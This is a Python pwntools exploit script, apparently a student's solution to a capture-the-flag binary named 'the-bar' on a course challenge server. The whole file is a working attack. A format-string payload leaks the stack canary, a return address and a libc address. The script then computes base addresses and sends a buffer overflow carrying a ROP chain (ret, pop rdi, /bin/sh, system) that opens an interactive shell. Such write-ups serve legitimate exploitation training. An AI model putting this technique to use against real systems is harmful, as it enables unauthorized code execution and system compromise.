# the-barex.py - Aidan Wech (Onyxymous)
from pwn import *

# debug info
bin64 = './the-bar'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# remote variables
host = 'cs4401shell2.walls.ninja'
port = 14161

# exploit variables
buffarg = 6
canaryarg = 9
unlockretarg = 11
mainretarg = 15
canaryoffset = 8 * (canaryarg - buffarg)
unlockretoffset = 8 * (unlockretarg - buffarg)
argleak = b'%' + bytes(str(canaryarg), 'utf-8') + b'$p %' + bytes(str(unlockretarg), 'utf-8') + b'$p %' + bytes(str(mainretarg), 'utf-8') + b'$p'

# process
p = process(bin64)
p.recvline(timeout=1)
p.recvline(timeout=1)
p.recvline(timeout=1)
p.recvline(timeout=1)
p.sendline(argleak)

# craft exploit string with canary value in it
leakedvals = p.recvline(timeout=1).strip().decode('utf-8')
canary = int(leakedvals.split()[0], 16)
unlockret = int(leakedvals.split()[1], 16)

# local offsets
systemoffset = 0x26fd0
libcoffset = 0x50d60
binshoffset = 0x1d8698

# server offsets
#systemoffset = 0x2d799
#libcoffset = 0x45420
#binshoffset = 0x18ca05

system = int(leakedvals.split()[2], 16) + systemoffset	# this offset will always point to system when added to main's return address
libcbase = system - libcoffset				# libc base address calculated using libc.rip
binbase = unlockret - 0x8fa				# binary base address calculated using return address of unlock()
retgadget = binbase + 0x6be				# return gadget
poprdigadget = binbase + 0x983				# pop rdi gadget
binsh = libcbase + binshoffset				# /bin/sh string in libc

log.info(f'Canary: {hex(canary)}')
log.info(f'Binary Base Address: {hex(binbase)}')
log.info(f'Libc Base Address: {hex(libcbase)}')
log.info(f'Ret: {hex(retgadget)}')
log.info(f'Pop %rdi: {hex(poprdigadget)}')
log.info(f'System Address: {hex(system)}')
log.info(f'/bin/sh Address: {hex(binsh)}')

exploit = flat({
canaryoffset: p64(canary),
unlockretoffset: p64(retgadget)}, 
p64(poprdigadget), 
p64(binsh), 
p64(system))
p.sendline(exploit)
p.interactive()
